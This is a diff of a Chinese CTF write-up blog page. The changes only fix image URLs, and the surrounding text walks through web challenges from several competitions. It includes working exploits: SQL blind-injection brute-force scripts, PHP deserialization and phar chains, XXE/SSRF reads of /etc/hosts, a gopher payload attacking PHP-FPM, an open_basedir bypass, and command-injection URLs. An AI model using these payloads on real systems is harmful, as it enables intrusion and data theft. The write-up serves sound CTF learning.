-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-14.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-14.png" alt></p>
 <p>打出来就是<code>flag{3399dcb7-9e15-422f-9bf9-9db30dab70ae}</code></p>
 <h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>题目：<code>cGxlYXNlIHN1Ym1pdDogZmxhZ3toZWxsb19ieWJ9</code></p>
 <p>exp</p>
@@ -1732,14 +1729,14 @@ for i in rgb:
 aircrack-ng -w pass.txt WiFi.pcap
 </code></pre><p>参考:<a href="https://jwt1399.top/2019/07/29/ctf-liu-liang-fen-xi-zong-jie/" target="_blank" rel="noopener">https://jwt1399.top/2019/07/29/ctf-liu-liang-fen-xi-zong-jie/</a></p>
 <h1 id="成都大学第二届玄武杯"><a href="#成都大学第二届玄武杯" class="headerlink" title="成都大学第二届玄武杯"></a>成都大学第二届玄武杯</h1><p>比赛面向他们校的新生，所以都是基础题，做了就蛮写一下</p>
-<h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/6-1.png" alt="6-1"></p>
-<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/7-1.png" alt="7-1"></p>
+<h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/成大玄武杯/6-1.png" alt="6-1"></p>
+<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/成大玄武杯/7-1.png" alt="7-1"></p>
 <h2 id="WeekPassword"><a href="#WeekPassword" class="headerlink" title="WeekPassword"></a>WeekPassword</h2><blockquote>
 <p>弱口令爆破</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/1-1.png" alt="1-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/成大玄武杯/1-1.png" alt="1-1"></p>
 <p>根据题目提示<code>weekpassword</code>，直接<code>top100</code>爆破，拿下 flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/1-2.png" alt="1-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/成大玄武杯/1-2.png" alt="1-2"></p>
 <h2 id="serialization-1"><a href="#serialization-1" class="headerlink" title="serialization-1"></a>serialization-1</h2><blockquote>
 <p>反序列化</p>
 </blockquote>
@@ -1785,13 +1782,13 @@ echo urlencode(serialize($b));
 ?&gt;
 </code></pre>
 <p>将序列化字符串经过<code>urlencode()</code>是因为<code>private</code>属性会有不可见字符，编码后可用</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/2-1.png" alt="2-1"></p>
-<h2 id="百度"><a href="#百度" class="headerlink" title="百度"></a>百度</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/3-1.png" alt="3-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/成大玄武杯/2-1.png" alt="2-1"></p>
+<h2 id="百度"><a href="#百度" class="headerlink" title="百度"></a>百度</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/成大玄武杯/3-1.png" alt="3-1"></p>
 <p>没有其他发现，还下载图片查看。最后扫目录，发现<code>robots.txt</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/3-2.png" alt="3-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/成大玄武杯/3-2.png" alt="3-2"></p>
 <p>访问拿到 flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/3-3.png" alt="3-3"></p>
-<h2 id="SQL-1"><a href="#SQL-1" class="headerlink" title="SQL-1"></a>SQL-1</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/4-1.png" alt="4-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/成大玄武杯/3-3.png" alt="3-3"></p>
+<h2 id="SQL-1"><a href="#SQL-1" class="headerlink" title="SQL-1"></a>SQL-1</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/成大玄武杯/4-1.png" alt="4-1"></p>
 <p>发现<code>password</code>处存在盲注，回显<code>Login Fail!</code>和<code>Login Success!</code></p>
 <p><strong>EXP</strong></p>
 <pre><code class="php">import requests,string
@@ -1822,8 +1819,8 @@ for i in range(1,30):
             print(flag)
             break
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/4-2.png" alt="4-2"></p>
-<h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/5-1.png" alt="5-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/成大玄武杯/4-2.png" alt="4-2"></p>
+<h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/成大玄武杯/5-1.png" alt="5-1"></p>
 <p>查看源码，有提示<code>hint.php</code>，查看发现如下代码</p>
 <pre><code class="php">function ctt($key)
 {
@@ -1859,7 +1856,7 @@ if ($auth) {
 }
 </code></pre>
 <p>看一下<code>cookie</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/5-2.png" alt="5-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/成大玄武杯/5-2.png" alt="5-2"></p>
 <p>因为<code>cookie</code>会自动<code>url编码</code>，所以需要先解码一下。先运行脚本得到<code>role1</code>的值为<code>adminadmin</code>。然后仔细观察，发现只要<code>urldecode($_COOKIE[&quot;role&quot;])</code>等于<code>ctt(base64_encode($s))</code>就能通过第二个条件，完整 EXP 如下</p>
 <pre><code class="php">&lt;?php
 
@@ -1882,7 +1879,7 @@ echo urlencode(ctt(base64_encode($s)));
 ?&gt;
 </code></pre>
 <p>然后把得到的值拿去提交就行了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/5-3.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/成大玄武杯/5-3.png" alt></p>
 <h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>题目源码</p>
 <pre><code class="php">no &lt;?php
 include(&#39;flag.php&#39;);
@@ -1903,30 +1900,30 @@ else {
 }
 highlight_file(__FILE__); 
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/8-1.png" alt="8-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/成大玄武杯/8-1.png" alt="8-1"></p>
 <p><code>$f2</code>和<code>$f3</code>全部传入字符串的<code>0</code>就可以了</p>
 <h1 id="NJUPT-CTF-2019"><a href="#NJUPT-CTF-2019" class="headerlink" title="NJUPT CTF 2019"></a>NJUPT CTF 2019</h1><p>大佬同学<a href="https://foxgrin.github.io/" target="_blank" rel="noopener">Somnus</a>把Web给AK了，参考他的WriteUp复现一遍</p>
 <p>一共记录 11 道 Web 题目</p>
-<h2 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/1-1.png" alt></p>
+<h2 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/1-1.png" alt></p>
 <p>抓到的请求当中，看到疑似<code>XXE</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/1-2.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/1-2.png" alt></p>
 <p>根据题目提示</p>
 <blockquote>
 <p>flag in /flag</p>
 </blockquote>
 <p>直接拿到 flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/1-3.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/1-3.png" alt></p>
 <h2 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h2><p>与上一题同样的界面</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/2-1.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/2-1.png" alt></p>
 <p>尝试，但是相比之前，没有返回了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/2-2.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/2-2.png" alt></p>
 <p>但是可以读取其他文件，说明这里是 flag 的位置换了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/2-3.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/2-3.png" alt></p>
 <p>读取源码没看到可以利用的点，只能想到利用<code>xxe</code>进行<code>ssrf</code>打内网，扫描一下储存内网 IP 的几个文件：<code>/etc/hosts</code>，<code>/proc/net/arp</code>，<code>/proc/net/fib_trie</code>。然后在<code>ARP表</code>中发现很多内网 IP</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/2-4.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/2-4.png" alt></p>
 <p>通过<code>http://</code>协议访问<code>192.168.1.8</code>，直接拿到 flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/2-5.png" alt></p>
-<h2 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/3-1.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/2-5.png" alt></p>
+<h2 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/3-1.png" alt></p>
 <p>并且有弹窗提示</p>
 <blockquote>
 <p>try to make the sqlquery have its own results</p>
@@ -1941,20 +1938,20 @@ highlight_file(__FILE__);
 <p>传入数据库部分就是</p>
 <pre><code class="mysql">select * from users where username=&#39;123\&#39; and passwd=&#39;||1;
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/3-2.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/3-2.png" alt></p>
 <p>出现 302 跳转，跟随跳转后提示</p>
 <blockquote>
 <p>hello friend,go back to get the password</p>
 </blockquote>
 <p>那就回来从<code>passwd</code>变量注，但是过滤了许多关键词：<code>substr、mid、select、database</code>。截取字符串的函数只剩下<code>right、left</code>但是逗号却被过滤了，也无法使用。现在就只能使用<code>regexp</code>对每个字符逐一匹配</p>
 <p>因为这里过滤了<code>单引号 &amp; 双引号</code>，所以我们自己构造的语句就无法匹配字符串</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/3-5.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/3-5.png" alt></p>
 <p>但是这可以用<code>十六进制代替</code>，因为<code>mysql</code>是接受<code>十六进制</code>的（前面要加0x），并且会将十六进制转<code>ASCII</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/3-4.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/3-4.png" alt></p>
 <p>先尝试<code>0x61（也就是 a）</code></p>
 <pre><code class="url">username=123\&amp;passwd=||username/**/regexp/**/0x61;%00
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/3-6.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/3-6.png" alt></p>
 <p>发现之前的提示：<code>try to make the sqlquery have its own results</code>没了，说明是可以利用的。所以现在结合还可以使用的<code>ascii()</code>函数，写爆破 EXP：</p>
 <p>Ps：① 因为直接传入<code>%00</code>会被黑名单检测到，所以这里的 python 代码中可以用<code>chr(0)</code>代替；② 因为有一次跑出来的结果是<code>er_know7788990</code>，发现是不完整的，于是手动注第一个字母（除了 e 之外，就是 0x79 了），再开始</p>
 <pre><code class="python">import requests,string
@@ -1975,24 +1972,24 @@ while(1):
         else:
             data[&quot;passwd&quot;] = data[&quot;passwd&quot;][0:-4] + hex(ord(i))[-2:] + &quot;;&quot; + chr(0)
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/3-7.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/3-7.png" alt></p>
 <p>转换得到明文</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/3-8.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/3-8.png" alt></p>
 <p>任意用户名，然后用刚才注出来的密码登陆，拿下 flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/3-3.png" alt></p>
-<h2 id="phar-matches-everything"><a href="#phar-matches-everything" class="headerlink" title="phar matches everything"></a>phar matches everything</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-1.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/3-3.png" alt></p>
+<h2 id="phar-matches-everything"><a href="#phar-matches-everything" class="headerlink" title="phar matches everything"></a>phar matches everything</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-1.png" alt></p>
 <p>上传文件的地方，尝试后提示只能上传<code>jpg、png、gif、jpeg</code></p>
 <blockquote>
 <p>File is not an image.Sorry, only jpg,png,gif,jpeg are allowed.Sorry, your file was not uploaded.  </p>
 </blockquote>
 <p>可以通过添加jpg的文件头绕过，但是生成的文件后缀是<code>jpeg</code>，没有本地文件包含漏洞也无法使用</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-3.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-3.png" alt></p>
 <p>回想题目第一个提示</p>
 <blockquote>
 <p> I hate VIM. </p>
 </blockquote>
 <p>是 VIM 编辑留下的备份文件，可能会留下<code>.swp</code>的备份文件，尝试后发现<code>.catchmime.php.swp</code>，下载源码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-2.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-2.png" alt></p>
 <p>通过如下命令恢复<code>swp</code>备份文件</p>
 <pre><code class="bash">sudo vi -r catchmime.php.swp
 </code></pre>
@@ -2066,28 +2063,28 @@ $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压�
 $phar-&gt;stopBuffering();
 ?&gt;
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-4.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-4.png" alt></p>
 <p>将生成的<code>phar</code>文件后缀改为<code>jpeg</code>，然后上传</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-5.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-5.png" alt></p>
 <p>上传序列化字符串，然后phar协议访问上传的文件</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-6.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-6.png" alt></p>
 <p>修改<code>phar</code>内文件为<code>/etc/hosts</code>，再上传查看，发现只有记录<code>10.0.0.2</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-7.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-7.png" alt></p>
 <p>在换成<code>ARP表（/proc/net/arp）</code>，发现有两个内网IP</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-8.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-8.png" alt></p>
 <p>将生成phar文件的<code>Metadata</code>部分改为<code>http</code>协议，访问<code>10.0.0.3</code>。发现<code>FPM</code></p>
 <pre><code class="url">http://10.0.0.3
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-9.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-9.png" alt></p>
 <p>接下来思路就是<code>ssrf+gopher打fpm</code>，参考文章：<a href="https://evoa.me/index.php/archives/52/" target="_blank" rel="noopener">攻击PHP-FPM</a></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-10.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-10.png" alt></p>
 <p>然后将开头的<code>127.0.0.1</code>改为<code>10.0.0.3</code>，端口默认<code>9000</code>不用改，写入phar的payload</p>
 <pre><code class="php">$this-&gt;url = &quot;gopher://10.0.0.3:9000/_%01%01%E2U%00%08%00%00%00%01%00%00%00%00%00%00%01%04%E2U%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%E2U%00%00%00%00%01%05%E2U%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%E2U%00%00%00%00&quot;;
 </code></pre>
 <p>上传然后访问，成功返回</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-11.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-11.png" alt></p>
 <p><code>open_basedir</code>是<code>/var/www/html:/tmp</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-12.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-12.png" alt></p>
 <p><code>disable_functions</code>如下</p>
 <pre><code class="php">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,
 pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,
@@ -2100,10 +2097,10 @@ symlink,link,syslog,imap_open,dl,system,mb_send_mail,mail,error_log,unlink,delet
 <p>Ps：还是要记得127.0.0.1改成10.0.0.3</p>
 <pre><code class="php">&lt;?php mkdir(&#39;/tmp/knlvre&#39;);chdir(&#39;/tmp/knlvre/&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(show_source(&#39;/flag&#39;))?&gt;
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-13.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-13.png" alt></p>
 <p>上传访问，拿下flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-14.png" alt></p>
-<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/5-1.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/4-14.png" alt></p>
+<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/5-1.png" alt></p>
 <p>源码如下</p>
 <pre><code class="php"> &lt;?php
 error_reporting(0);
@@ -2191,7 +2188,7 @@ while(1):
         print(str(i) + &quot;   ===&gt;   &quot; + md5(str(i)))
         i += 1
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/5-3.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/5-3.png" alt></p>
 <p>str2的爆破代码（<code>240610708</code>）</p>
 <pre><code class="python">import hashlib,re
 from multiprocessing import Process
@@ -2209,53 +2206,53 @@ while(1):
         print(str(i) + &quot;   ===&gt;   &quot; + md5(str(i)))
         i += 1
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/5-2.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/5-2.png" alt></p>
 <p>第三层：①传入的变量<code>q_w_q</code>长度不能超过8；②传入的<code>$_SERVER[&#39;QUERY_STRING&#39;]（也就是问号后面内容）</code>不能有<code>_</code>或者<code>%5f</code>。因为PHP会将传入的变量中的<code>点（.）</code>转换成为<code>下划线（_）</code>，所以可以绕过；③无法使用<code>ls</code>和<code>pwd</code>，我们可以用<code>dir</code></p>
 <pre><code class="url">?num=23333%0a&amp;str1=2120624&amp;str2=240610708&amp;q.w.q=dir%20./
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/5-4.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/5-4.png" alt></p>
 <p>直接查看<code>flllag.php</code>的话会太长，于是使用通配符</p>
 <pre><code class="url">?num=23333%0a&amp;str1=2120624&amp;str2=240610708&amp;q.w.q=head%20fl*
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/5-5.png" alt></p>
-<h2 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/6-1.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/5-5.png" alt></p>
+<h2 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/6-1.png" alt></p>
 <p><code>hint.php</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/6-2.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/6-2.png" alt></p>
 <p>替换页面很像是<code>preg_replace()</code>函数的功能，直接尝试命令执行</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/6-3.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/6-3.png" alt></p>
 <p>没有<code>disable_functions</code>，测试发现过滤了引号</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/6-4.png" alt="6-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/6-4.png" alt="6-4"></p>
 <p>用<code>chr()</code>函数表示字符，用<code>.</code>拼接</p>
 <pre><code>sub=1&amp;pat=1&amp;rep=show_source(chr(47).chr(102).chr(108).chr(97).chr(103))
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/6-5.png" alt="6-5"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/6-5.png" alt="6-5"></p>
 <p>或者这样</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/6-6.png" alt="6-6"></p>
-<h2 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/7-1.png" alt="7-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/6-6.png" alt="6-6"></p>
+<h2 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/7-1.png" alt="7-1"></p>
 <p>其他两个界面都正常，但是<code>SHA256</code>界面出现提示</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/7-2.png" alt="7-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/7-2.png" alt="7-2"></p>
 <p>测试其他路径，发现直接回显我们的输入</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/7-3.png" alt="7-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/7-3.png" alt="7-3"></p>
 <p>测试发现存在<code>SSTI</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/7-4.png" alt="7-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/7-4.png" alt="7-4"></p>
 <p>过滤了<code>flag</code>关键字</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/7-5.png" alt="7-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/7-5.png" alt="7-5"></p>
 <p>用字符串拼接绕过</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/7-6.png" alt="7-6"></p>
-<h2 id="Upload-your-Shell"><a href="#Upload-your-Shell" class="headerlink" title="Upload your Shell"></a>Upload your Shell</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/8-1.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/7-6.png" alt="7-6"></p>
